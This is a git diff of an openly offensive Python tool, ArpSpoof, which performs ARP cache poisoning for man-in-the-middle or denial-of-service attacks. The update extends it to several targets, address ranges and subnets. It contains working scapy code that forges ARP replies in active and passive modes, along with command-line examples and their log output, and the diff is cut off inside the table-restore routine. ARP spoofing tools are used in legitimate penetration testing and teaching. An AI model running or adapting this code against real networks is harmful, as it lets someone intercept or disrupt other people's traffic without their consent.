@@ -3,7 +3,7 @@
 
 ###################
 #    This package implements an ARP Spoofer for MIM or DoS attacks
-#    Copyright (C) 2021  Maurice Lambert
+#    Copyright (C) 2021, 2022  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -23,35 +23,204 @@
 This package implements an ARP Spoofer for MIM
 (Man-In-the-Middle) or DoS (Denial of Service) attacks.
 
->>> spoofer = SpooferARP('172.16.10.1', '172.16.0.35')
+>>> from scapy.all import conf
+>>> from ArpSpoof import SpooferARP
+
+PythonToolsKit  Copyright (C) 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+
+ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.2')
 >>> spoofer.active_cache_poisonning()
+[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2.
+Traceback (most recent call last):
+  ...
+KeyboardInterrupt
+>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.2,127.0.0.3')
+>>> spoofer.active_cache_poisonning()
+[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3.
+Traceback (most recent call last):
+  ...
+KeyboardInterrupt
+>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.2-127.0.0.5')
+>>> spoofer.active_cache_poisonning()
+[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3, 127.0.0.4.
+Traceback (most recent call last):
+  ...
+KeyboardInterrupt
+>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.0/30')
+>>> spoofer.active_cache_poisonning()
+[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.1, 127.0.0.2.
+Traceback (most recent call last):
+  ...
+KeyboardInterrupt
 >>> spoofer = SpooferARP('172.16.10.1', '172.16.0.35', conf.iface, False, 0.5)
 >>> spoofer.passive_cache_poisonning(asynchronous=True)
+[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:380} Start passive ARP spoof... Gateway: 172.16.10.1 [None]. Targets: 172.16.0.35.
 >>> spoofer.run = False
 >>> spoofer.sniffer.stop()  # only with asynchronous mode
+<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>
 >>> spoofer.restore()       # only with asynchronous mode
 
-~# python3 ArpSpoof.py 172.16.10.1 172.16.0.33
-[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:183} Start ARP spoof between 172.16.10.1 (2e:d7:11:94:e4:82) and 172.16.0.33 (85:43:71:78:55:54).
-[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:426} End of ARP spoofing. Restore ARP table...
-[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:428} End of ARP spoofing. The ARP tables are restored.
-~# python3 ArpSpoof.py 172.16.10.1 172.16.0.33 -p -s -v -t 1 -i 172.16.10.
-[2021-12-01 22:12:43] DEBUG    (10) {__main__ - ArpSpoof.py:383} Logging is configured.
-[2021-12-01 22:12:43] INFO     (20) {__main__ - ArpSpoof.py:393} Interface argument match with (172.16.10.34 cf:e4:cf:5f:8a:4c WIFI)
-[2021-12-01 22:12:43] INFO     (20) {__main__ - ArpSpoof.py:400} Network interface is configured (IP: 172.16.10.34, MAC: cf:e4:cf:5f:8a:4c and name: WIFI)
-[2021-12-01 22:12:43] DEBUG    (10) {__main__ - ArpSpoof.py:153} Get IP and MAC addresses...
-[2021-12-01 22:12:46] INFO     (20) {__main__ - ArpSpoof.py:160} Gateway: 172.16.10.1 2e:d7:11:94:e4:82
-[2021-12-01 22:12:46] INFO     (20) {__main__ - ArpSpoof.py:161} Spoof: 172.16.0.33 85:43:71:78:55:54
-[2021-12-01 22:12:46] DEBUG    (10) {__main__ - ArpSpoof.py:175} The packets are built.
-[2021-12-01 22:12:46] WARNING  (30) {__main__ - ArpSpoof.py:225} Start passive ARP spoof between 172.16.10.1 (2e:d7:11:94:e4:82) and 172.16.0.33 (85:43:71:78:55:54).
-[13/01/2022 11:03:01] INFO     (20) {__main__ - ArpSpoof.py:213} Spoof 172.16.10.1 for 172.16.0.33
-[2021-12-01 22:13:02] WARNING  (30) {__main__ - ArpSpoof.py:426} End of ARP spoofing. Restore ARP table...
-[2021-12-01 22:13:02] DEBUG    (10) {__main__ - ArpSpoof.py:295} Restoring ARP tables for the target...
-[2021-12-01 22:13:06] DEBUG    (10) {__main__ - ArpSpoof.py:309} The target's ARP tables are restored.
-[2021-12-01 22:13:06] CRITICAL (50) {__main__ - ArpSpoof.py:428} End of ARP spoofing. The ARP tables are restored.
+~# python3 ArpSpoof.py 127.0.0.1 127.0.0.2
+
+PythonToolsKit  Copyright (C) 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+
+ArpSpoof  Copyright (C) 2021  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:209} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2.
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:471} End of ARP spoofing. Restore ARP table...
+[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:473} End of ARP spoofing. The ARP tables are restored.
+
+~# python3 ArpSpoof.py -v 127.0.0.1 127.0.0.2,127.0.0.5
+
+PythonToolsKit  Copyright (C) 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+
+ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:433} Logging is configured.
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:435} Network interface is configured (IP: 169.254.155.222, MAC: e8:6a:64:bc:b5:fa and name: WiFi or WiFi)
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:151} Get IP and MAC addresses...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:160} Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:161} Spoof: 127.0.0.2, 127.0.0.5
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:180} Start packets crafting for 127.0.0.2 [ff:ff:ff:ff:ff:ff]...
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:180} Start packets crafting for 127.0.0.5 [ff:ff:ff:ff:ff:ff]...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:194} Packets are built.
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:202} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.5.
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.2'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.2' for '127.0.0.1'
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.5'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.5' for '127.0.0.1'
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.2'
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.5'
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.2'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.2' for '127.0.0.1'
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.5'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.5' for '127.0.0.1'
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.2'
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.5'
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:464} End of ARP spoofing. Restore ARP table...
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:337} Restoring ARP tables for the target...
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (0/6)...
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (0/6)...
+[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (1/6)...
+[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (1/6)...
+[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (2/6)...
+[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (2/6)...
+[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (3/6)...
+[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (3/6)...
+[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (4/6)...
+[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (4/6)...
+[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (5/6)...
+[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (5/6)...
+[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (6/6)...
+[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (6/6)...
+[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:466} End of ARP spoofing. The ARP tables are restored.
+
+~# python3 ArpSpoof.py 127.0.0.1 127.0.0.2-127.0.0.5
+
+PythonToolsKit  Copyright (C) 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+
+ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:202} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3, 127.0.0.4.
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:464} End of ARP spoofing. Restore ARP table...
+[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:466} End of ARP spoofing. The ARP tables are restored.
+
+~# python3 ArpSpoof.py 127.0.0.1 -t 1 127.0.0.0/29
+
+PythonToolsKit  Copyright (C) 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+
+ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:202} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.1, 127.0.0.2, 127.0.0.3, 127.0.0.4, 127.0.0.5, 127.0.0.6.
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:464} End of ARP spoofing. Restore ARP table...
+[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:466} End of ARP spoofing. The ARP tables are restored.
+
+~# python ArpSpoof.py 127.0.0.1 127.0.0.2,127.0.0.3 -p -s -v -t 1 -i 127.0.0.
+
+PythonToolsKit  Copyright (C) 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+
+ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:541} Logging is configured.
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:543} Network interface is configured (IP: , MAC:  and name: loopback or loopback)
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:243} Get IP and MAC addresses...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:252} Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:253} Spoof: 127.0.0.2, 127.0.0.3
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:272} Start packets crafting for 127.0.0.2 [ff:ff:ff:ff:ff:ff]...
+[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:272} Start packets crafting for 127.0.0.3 [ff:ff:ff:ff:ff:ff]...
+[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:286} Packets are built.
+[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:351} Start passive ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3.
+[2022-06-22 11:12:15] INFO     (20) {__main__ - ArpSpoof.py:399} Spoof 127.0.0.1 for 127.0.0.3
+[2022-06-22 11:12:15] INFO     (20) {__main__ - ArpSpoof.py:399} Spoof 127.0.0.1 for 127.0.0.3
+[2022-06-22 11:12:16] INFO     (20) {__main__ - ArpSpoof.py:406} Spoof 127.0.0.2 for 127.0.0.1
+[2022-06-22 11:12:16] INFO     (20) {__main__ - ArpSpoof.py:406} Spoof 127.0.0.2 for 127.0.0.1
+[2022-06-22 11:12:16] DEBUG    (10) {__main__ - ArpSpoof.py:445} Restoring ARP tables...
+[2022-06-22 11:12:16] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (0/6)...
+[2022-06-22 11:12:16] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (0/6)...
+[2022-06-22 11:12:17] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (1/6)...
+[2022-06-22 11:12:17] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (1/6)...
+[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (2/6)...
+[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (2/6)...
+[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (3/6)...
+[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (3/6)...
+[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (4/6)...
+[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (4/6)...
+[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (5/6)...
+[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (5/6)...
+[2022-06-22 11:12:20] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (6/6)...
+[2022-06-22 11:12:20] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (6/6)...
+[2022-06-22 11:12:20] WARNING  (30) {__main__ - ArpSpoof.py:572} End of ARP spoofing. Restore ARP table...
 """
 
-__version__ = "1.1.0"
+__version__ = "1.1.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -64,7 +233,7 @@ license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/ArpSpoof"
 
 copyright = """
-ArpSpoof  Copyright (C) 2021  Maurice Lambert
+ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
@@ -83,112 +252,22 @@ from scapy.all import (
     Packet,
     sniff,
     AsyncSniffer,
-    IFACES,
 )
-from logging import StreamHandler, Formatter, Logger, getLogger, DEBUG, WARNING
-from argparse import ArgumentParser, Namespace
+from PythonToolsKit.GetType import get_ipv4_addresses
+from PythonToolsKit.ScapyTools import ScapyArguments
+from PythonToolsKit.Logs import get_custom_logger
 from scapy.interfaces import NetworkInterface
+from logging import Logger, DEBUG, WARNING
 from collections.abc import Callable
-from ipaddress import ip_address
+from ipaddress import IPv4Address
 from socket import gethostbyname
-from sys import exit, stdout
-from typing import List
+from argparse import Namespace
+from typing import ValuesView
+from functools import partial
 from time import sleep
+from sys import exit
 
-conf_iface = conf.iface
-
-
-class ScapyArguments(ArgumentParser):
-
-    """
-    This class implements ArgumentsParser with
-    interface argument and iface research.
-    """
-
-    interface_args: list = ["--interface", "-i"]
-    interface_kwargs: dict = {
-        "help": "Part of the IP, MAC or name of the interface",
-    }
-
-    def __init__(
-        self,
-        *args,
-        interface_args=interface_args,
-        interface_kwargs=interface_kwargs,
-        **kwargs,
-    ):
-        super().__init__(*args, **kwargs)
-        self.interface_args = interface_args
-        self.interface_kwargs = interface_kwargs
-        self.add_argument(*interface_args, **interface_kwargs)
-
-    def parse_args(
-        self, args: List[str] = None, namespace: Namespace = None
-    ) -> Namespace:
-
-        """
-        This function implements the iface
-        research from interface arguments.
-        """
-
-        namespace: Namespace = ArgumentParser.parse_args(self, args, namespace)
-
-        argument_name: str = max(self.interface_args, key=len)
-        for char in self.prefix_chars:
-            if char == argument_name[0]:
-                argument_name = argument_name.lstrip(char)
-                break
-
-        interface = getattr(namespace, argument_name, None)
-
-        if interface is not None:
-            interface = interface.casefold()
-
-            for temp_iface in IFACES.values():
-
-                ip = temp_iface.ip
-                mac = temp_iface.mac or ""
-                name = temp_iface.name or ""
-                network_name = temp_iface.network_name or ""
-
-                mac = mac.casefold()
-                name = name.casefold()
-                network_name = network_name.casefold()
-
-                if (
-                    (ip and interface in ip)
-                    or (mac and interface in mac)
-                    or (name and interface in name)
-                    or (network_name and interface in network_name)
-                ):
-                    namespace.iface = temp_iface
-                    return namespace
-
-        namespace.iface = conf_iface
-        return namespace
-
-
-def get_custom_logger() -> Logger:
-
-    """
-    This function create a custom logger.
-    """
-
-    logger = getLogger(__name__)  # default logger.level == 0
-
-    formatter = Formatter(
-        fmt=(
-            "%(asctime)s%(levelname)-9s(%(levelno)s) "
-            "{%(name)s - %(filename)s:%(lineno)d} %(message)s"
-        ),
-        datefmt="[%Y-%m-%d %H:%M:%S] ",
-    )
-    stream = StreamHandler(stream=stdout)
-    stream.setFormatter(formatter)
-
-    logger.addHandler(stream)
-
-    return logger
+conf_iface: NetworkInterface = conf.iface
 
 
 class SpooferARP:
@@ -200,7 +279,7 @@ class SpooferARP:
     def __init__(
         self,
         gateway: str,
-        ip_spoof: str,
+        targets: str,
         iface: NetworkInterface = conf_iface,
         semi: bool = False,
         inter: float = 0.5,
@@ -209,41 +288,68 @@ class SpooferARP:
         self.inter = inter
         self.iface = iface
         self.gateway_name = gateway
-        self.spoof_name = ip_spoof
 
         try:
-            gateway = self.gateway = str(ip_address(gateway))
+            gateway = self.gateway = str(IPv4Address(gateway))
         except ValueError:
             gateway = self.gateway = gethostbyname(gateway)
 
+        # try:
+        #     ip_spoof = self.ip_spoof = str(ip_address(ip_spoof))
+        # except ValueError:
+        #     ip_spoof = self.ip_spoof = gethostbyname(ip_spoof)
+
         try:
-            ip_spoof = self.ip_spoof = str(ip_address(ip_spoof))
-        except ValueError:
-            ip_spoof = self.ip_spoof = gethostbyname(ip_spoof)
+            targets_object = get_ipv4_addresses(targets)
+        except ValueError as e:
+            logger_error(
+                f"Invalid IP addresses or network: {e.__class__.__name__}: {e}"
+            )
 
         logger_debug("Get IP and MAC addresses...")
 
         # self.my_ip = iface.ip
-        my_mac = self.my_mac = iface.mac
+        self.my_mac = iface.mac or '00:00:00:00:00:00'
         gateway_mac = self.gateway_mac = getmacbyip(gateway, chainCC=1)
-        mac_spoof = self.mac_spoof = getmacbyip(ip_spoof, chainCC=1)
+        spoof_addresses = self.spoof_addresses = {
+            str(ip): getmacbyip(str(ip), chainCC=1) for ip in targets_object
+        }
 
-        logger_info(f"Gateway: {gateway} {gateway_mac}")
-        logger_info(f"Spoof: {ip_spoof} {mac_spoof}")
+        logger_info(f"Gateway: {gateway} [{gateway_mac}]")
+        logger_info(f"Spoof: {', '.join(list(spoof_addresses))}")
 
         self.run = True
 
-        self.spoof_gateway = Ether(dst=mac_spoof, src=my_mac) / ARP(
-            op=2, pdst=ip_spoof, psrc=gateway, hwsrc=my_mac
-        )
-        self.spoof_target = Ether(dst=gateway_mac, src=my_mac) / ARP(
-            op=2,
-            pdst=gateway,
-            psrc=ip_spoof,
-            hwsrc=my_mac,
-        )
+        self.build_packets()
 
-        logger_debug("The packets are built.")
+    def build_packets(self) -> None:
+
+        """
+        This function crafts packets.
+        """
+
+        packets_spoof_gateway = self.packets_spoof_gateway = {}
+        packets_spoof_targets = self.packets_spoof_targets = {}
+        my_mac = self.my_mac
+        gateway = self.gateway
+        gateway_mac = self.gateway_mac
+
+        for ip, mac in self.spoof_addresses.items():
+            logger_debug(f"Start packets crafting for {ip} [{mac}]...")
+
+            packets_spoof_gateway[ip] = Ether(dst=mac, src=my_mac) / ARP(
+                op=2, pdst=ip, psrc=gateway, hwsrc=my_mac
+            )
+            packets_spoof_targets[ip] = Ether(
+                dst=gateway_mac, src=my_mac
+            ) / ARP(
+                op=2,
+                pdst=gateway,
+                psrc=ip,
+                hwsrc=my_mac,
+            )
+
+        logger_info("Packets are built.")
 
     def active_cache_poisonning(self) -> None:
 
@@ -252,8 +358,8 @@ class SpooferARP:
         """
 
         logger_warning(
-            f"Start ARP spoof between {self.gateway} ({self.gateway_mac})"
-            f" and {self.ip_spoof} ({self.mac_spoof})."
+            f"Start ARP spoof... Gateway: {self.gateway} [{self.gateway_mac}]"
+            f". Targets: {', '.join(list(self.spoof_addresses))}."
         )
 
         active_spoof = self.active_spoof
@@ -275,24 +381,31 @@ class SpooferARP:
 
         iface = self.iface
         gateway = self.gateway
-        ip_spoof = self.ip_spoof
-        logger_debug("Send ARP packet to spoof gateway IP...")
 
-        sendp(
-            self.spoof_gateway,
-            iface=iface,
-            verbose=0,
-        )
-        logger_info(f"Spoof {gateway} for {ip_spoof}")
+        for ip, packet in self.packets_spoof_targets.items():
+            logger_debug(f"Send ARP packet to spoof target {ip!r}...")
 
-        if not self.semi:
-            logger_debug("Send ARP packet to spoof target IP...")
             sendp(
-                self.spoof_target,
+                packet,
                 iface=iface,
                 verbose=0,
             )
-            logger_info(f"Spoof {ip_spoof} for {gateway}")
+
+            logger_info(f"Spoof {ip!r} for {gateway!r}")
+
+        if not self.semi:
+            for ip, packet in self.packets_spoof_gateway.items():
+                logger_debug(
+                    f"Send ARP packet to spoof gateway {gateway!r}..."
+                )
+
+                sendp(
+                    packet,
+                    iface=iface,
+                    verbose=0,
+                )
+
+                logger_info(f"Spoof {gateway!r} for {ip!r}")
 
     def passive_cache_poisonning(self, asynchronous: bool = False) -> None:
 
@@ -300,15 +413,17 @@ class SpooferARP:
         This function implements a passive cache poisonning attack.
         """
 
+        lfilter = partial(self.filter, mac_addresses=self.spoof_addresses.values())
         logger_warning(
-            f"Start passive ARP spoof between {self.gateway} "
-            f"({self.gateway_mac}) and {self.ip_spoof} ({self.mac_spoof})."
+            f"Start passive ARP spoof... Gateway: {self.gateway} "
+            f"[{self.gateway_mac}]. Targets: "
+            f"{', '.join(list(self.spoof_addresses))}."
         )
 
         if asynchronous:
             self.sniffer = AsyncSniffer(
                 store=False,
-                lfilter=self.filter,
+                lfilter=lfilter,
                 stop_filter=lambda x: self.run,
                 prn=self.passive_spoof,
                 iface=self.iface,
@@ -317,7 +432,7 @@ class SpooferARP:
         else:
             sniff(
                 store=False,
-                lfilter=self.filter,
+                lfilter=lfilter,
                 stop_filter=lambda x: not self.run,
                 prn=self.passive_spoof,
                 iface=self.iface,
@@ -331,23 +446,26 @@ class SpooferARP:
         """
 
         gateway = self.gateway
+        arp = packet[ARP]
+        source = arp.psrc
 
-        if packet[ARP].pdst == gateway:
+        if source == gateway:
+            destination = arp.pdst
             sendp(
-                self.spoof_gateway,
+                self.packets_spoof_gateway[destination],
                 iface=self.iface,
                 verbose=0,
             )
-            logger_info(f"Spoof {gateway} for {self.ip_spoof}")
+            logger_info(f"Spoof {gateway} for {destination}")
         else:
             sendp(
-                self.spoof_target,
+                self.packets_spoof_targets[source],
                 iface=self.iface,
                 verbose=0,
             )
-            logger_info(f"Spoof {self.ip_spoof} for {gateway}")
+            logger_info(f"Spoof {source} for {gateway}")
 
-    def filter(self, packet: Packet) -> bool:
+    def filter(self, packet: Packet, mac_addresses: ValuesView = ()) -> bool:
 
         """
         This function implements a filter for passive attack.
@@ -358,14 +476,13 @@ class SpooferARP:
             arp = getlayer(ARP)
             ethernet = getlayer(Ether)
 
-            if arp.op == 1 and (
-                (ethernet.src == self.mac_spoof and arp.pdst == self.gateway)
+            return arp.op == 1 and (
+                (ethernet.src in mac_addresses and arp.pdst == self.gateway)
                 or (
                     ethernet.src == self.gateway_mac
-                    and arp.pdst == self.ip_spoof
+                    and arp.pdst in self.spoof_addresses
                 )
-            ):
-                return True
+            )
 
         return False
 
@@ -375,43 +492,45 @@ class SpooferARP:
         This function restore ARP tables after ARP cache poisonning.
         """
 
-        logger_debug("Restoring ARP tables for the target...")
+        logger_debug("Restoring ARP tables...")
         gateway_mac = self.gateway_mac
-        mac_spoof = self.mac_spoof
-        ip_spoof = self.ip_spoof
         gateway = self.gateway
         iface = self.iface
+        semi = self.semi
 
-        sendp(
-            Ether(src=gateway_mac, dst=mac_spoof)
-            / ARP(
-                op=2,
-                pdst=ip_spoof,
-                psrc=gateway,
-                hwsrc=gateway_mac,
-            ),
-            iface=iface,
-            inter=0.5,
-            count=7,
-            verbose=0,
-        )
-        logger_debug("The target's ARP tables are restored.")
-        if not self.semi:
-            logger_debug("Restoring ARP tables for the gateway...")
-            sendp(
-                Ether(src=mac_spoof, dst=gateway_mac)
-                / ARP(
-                    op=2,
-                    pdst=gateway,
-                    psrc=ip_spoof,
-                    hwsrc=mac_spoof,
-                ),
-                iface=iface,
-                inter=0.5,
-                count=7,
-                verbose=0,
-            )
-            logger_debug("The gateway's ARP tables are restored.")
+        for count in range(7):
+            for ip, mac in self.spoof_addresses.items():
+                logger_debug(f"Restore {gateway!r} for {ip!r} ({count}/6)...")
+
+                sendp(
+                    Ether(src=gateway_mac, dst=mac)
+                    / ARP(
